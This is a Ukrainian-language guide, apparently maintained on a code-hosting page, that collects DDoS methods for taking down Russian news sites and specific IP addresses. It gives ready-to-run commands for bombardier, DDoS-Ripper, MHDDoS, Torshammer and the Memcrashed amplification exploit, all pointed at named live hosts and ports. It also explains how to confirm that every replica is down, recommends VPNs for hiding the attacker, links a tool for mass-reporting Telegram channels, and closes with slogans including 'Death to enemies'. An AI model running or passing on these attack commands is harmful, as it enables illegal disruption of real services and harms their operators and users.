# Збірка DDoS методів

# Туторіали про DDoS
- https://docs.google.com/document/d/18nxvjQuHpAgrJ-t9S9CJ9dPK9_z0F73UrBpBFn7ZyVo/edit
- https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2
- https://zhashkevych.notion.site/zhashkevych/DDOS-1758d62440c34f6186c2cefdeee204a0


## Як провірити чи сайт "впав" остаточно

Справ в тому, що один сайт по домену за собою може мати багато хостів (репліки, лоад балансінг), і тому "завалити" сайт, значить завалити всі його хости по ІП адресах. І тому простий `ping gazeta.ru` або `ping gazeta.ru -s 2048` не навантажить хост і точно не всі інші хости якось сильно зачепить. PING для gazeta.ru показує ІП адресу 81.19.72.5. Але наступного разу, ІП адреса вже може бути інша `ping gazeta.ru` => `PING gazeta.ru (81.19.72.2): 56 data bytes` а ІП адрес є аж 6 (81.19.72.0 - 81.19.72.5).

На сайті https://dnschecker.org/ - можна звірити які саме ІП адреси відносяться до певного домену (сайту якого ви таргетуєте).

Також є команда `nslookup` (Windows, Unix++). Приклад:

```
$ nslookup gazeta.ru

Server:		10.92.0.1
Address:	10.92.0.1#53

Non-authoritative answer:
Name:	gazeta.ru
Address: 81.19.72.2
Name:	gazeta.ru
Address: 81.19.72.5
Name:	gazeta.ru
Address: 81.19.72.0
Name:	gazeta.ru
Address: 81.19.72.1
Name:	gazeta.ru
Address: 81.19.72.4
Name:	gazeta.ru
Address: 81.19.72.3
```

**ping** метод (відкривати в Tor Browser або в будь-якому якщо є окрмеий VPN).

Ці сайти, це аналог звичайного ping-a тільки є дані про репліки (лоад балансінг хости)

```
https://port.ping.pe/194.54.14.186:53
```
*АКТУАЛЬНІ ПИТАННЯ*:
- Префікс на сторінці пише TCP port check, але порт може бути вписани як і 80 (HTTP) так і 443 (HTTPS). Але [тут](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) пише, що і 22 (для `ssh`) і 53 (для DNS) є портами як TCP так і UDP. Треба тільки це підтвердити на тестах.

Клікнути на ОК, і чекати поки інфо рефрешнеться про всі репліки. Ціль - ВСІ ЧЕРВОНІ

А тут вписати ТІЛЬКИ ХОСТ і клікнути UDP port (або Ping для провірки)

```
https://check-host.net/check-udp?host=194.54.14.187
```

*АКТУАЛЬНІ ПИТАННЯ*: 
- чи треба вписувати порт 53 якщо провіряєтсья UDP?


## DDoS-имо з Docker-ом



**Docker** метод 1 (треба VPN)

https://hub.docker.com/r/alpine/bombardier

```
docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:80
docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
```

*АКТУАЛЬНІ ПИТАННЯ*: 
- так треба `/UDP` чи `/TCP` для портів 22 чи 53 в кінці? Чи можна міксувати протоколи і порти з цими суфіксами? Чому люди міксують? 
- І взагалі пишуть, що bombardier не працює з TCP/UDP. Треба провірити хелп.

**Docker** метод 2 (треба VPN) - TBD




## DDoS-имо з Python-ом



**DDoS-Ripper** PYTHON метод (треба VPN)

https://github.com/palahsu/DDoS-Ripper

```
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q 10000 
```

**runner** (обгортка над DDoS Runner)

https://github.com/nitupkcuf/runner
що загалом в мене так і не запрацювало толком

```
brew install --cask docker
docker run --rm -it nitupkcuf/ddos-ripper:latest {HOSTNAME | IP}
```

*АКТУАЛЬНІ ПИТАННЯ*: 
- Треба нормально заінсталити і запустити (бо докер тут ставиться через `cask`)

**MHDDoS** PYTHON (тільки 3) метод (треба VPN)

https://github.com/MHProDev/MHDDoS

```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt 
python3 start.py udp 194.54.14.186:53 1000 3600
```

Норм якщо ви бачите "Attack Started !"
Але в мене на іншому компі депси не проінсталиись. рестартував. хз.

*АКТУАЛЬНІ ПИТАННЯ*: 
- Пару раз в мене запустилось, але потім щось пішло не так (потенційно pip vs. pip3).

**Tors Hammer**

```
Download manually from https://sourceforge.net/projects/torshammer/
or 
wget https://iweb.dl.sourceforge.net/project/torshammer/Torshammer/1.0/Torshammer%201.0.zip
unzip Torshammer\ 1.0.zip
cd Torshammer\ 1.0
./torshammer.py -t lenta.ru -p 80 -t 1024
```

Щоб вийти з процесу треба Ctrl + Z (бо Ctrl + C не виходить)
Норм коли пише
Posting: щось там....
і connected to host...

*АКТУАЛЬНІ ПИТАННЯ*: 
- Спочатку працювало для більшості хостів, а потім як я заінсталив через піп3 депенденсіс для MHDDoS то щось пішло не так.


**Memcrashed** Python + Docker

https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/
https://github.com/649/Memcrashed-DDoS-Exploit

```
git clone https://github.com/649/Memcrashed-DDoS-Exploit.git
cd Memcrashed-DDoS-Exploit
echo "SHODAN_KEY" > api.txt
docker build -t memcrashed .
docker run -it memcrashed
```
Але вимагає ключа для Schodan АПІ => https://www.shodan.io/

*АКТУАЛЬНІ ПИТАННЯ*: 
- Якось отримати ключ і спробувати. Може має сенс.



# VPN 

**ClearVPN**
Цитата з Телеграм каналу [DDOS по країні СЕПАРІВ](https://t.me/+97Y45he5lOI2ZTky)

> Інфовоїни! Для наших бешкецтв потрібний надійний захист. Наші друзі з MacPaw дають промокод на ClearVPN, користуйтесь на здоров'я.

> Infowarriors! Our riots need reliable protection. Our friends from MacPaw give a promo code on ClearVPN, enjoy. 

https://my.clearvpn.com/promo/redeem?code=SAVEUKRAINE

Треба зареєструватись, і вже тоді собі скачати програму для вашої ОС.
Правда той код діє до 2023го року тільки.

До речі, Росія в списку є.
Але IMHO, не зручний "переключатор країн", адже треба Деактивувати спочатку, потім ІП адреса стає ваша звичайна, потім Активувати, програмка підключає і міняє ІП адресу, що є відносно але довго в секундах. ExpressVPN по відчуттях переключає моментально.

**Інші**: 
- NordVPN https://nordvpn.com/, 
- Psiphon https://psiphon.ca/en/download.html?psiphonca
- ProtonVPN https://protonvpn.com/pricing (але пишуть, що є баг)
- SurfShark https://surfshark.com/deal/influencer?coupon=NETSTALKERS (увага - лінк з купоном)
- UrbanVPN https://www.urban-vpn.com/ (але пишуть що "сливает данные")
- ExpressVPN https://www.expressvpn.com/ (сам юзаю, бо на швидку руку купив перший попавший з найкращих, і пішло... Важливо, що Росії в списку не має)
- https://www.vpngate.net
- https://www.freeopenvpn.org

*VPN для Android*
- Secure VPN https://play.google.com/store/apps/details?id=com.fast.free.unblock.secure.vpn&hl=en_US&gl=US


# Інше

- Інструкція як автоматично скаржитись на хуйловські телеграм-канали - https://github.com/ftishko/de_d-mosk_l

_via Docker_
```
docker build -t de_d-mosk_l .
torsocks docker run --rm -it de_d-mosk_l - якщо встановлено тор
docker run —rm -it de_d-mosk_l
```

_via Python 3_
```
git clone https://github.com/ftishko/de_d-mosk_l.git
cd de_d-mosk_l
pip3 install -r requirements.txt
python3 runner.py

# win
pip install -r requirements.txt
python runner.py
```

# Слава Україні!

# Героям Слава!

# Слава Нації!

# Смерть Ворогам!

# Україна понад усе!

PS. Maintained by @Andrii_L
